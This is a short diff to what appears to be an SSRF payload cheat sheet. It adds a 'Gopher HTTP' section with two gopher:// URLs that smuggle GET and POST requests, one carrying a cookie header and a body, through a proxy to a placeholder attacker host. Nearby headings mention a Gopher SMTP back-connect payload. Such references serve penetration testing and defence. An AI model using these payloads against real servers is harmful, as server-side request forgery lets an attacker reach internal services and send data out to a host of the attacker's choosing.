@@ -277,6 +277,13 @@ You didn't say the magic word !
 QUIT
 ```
 
+#### Gopher HTTP
+
+```powershell
+gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
+gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
+```
+
 #### Gopher SMTP - Back connect to 1337
 
 ```php
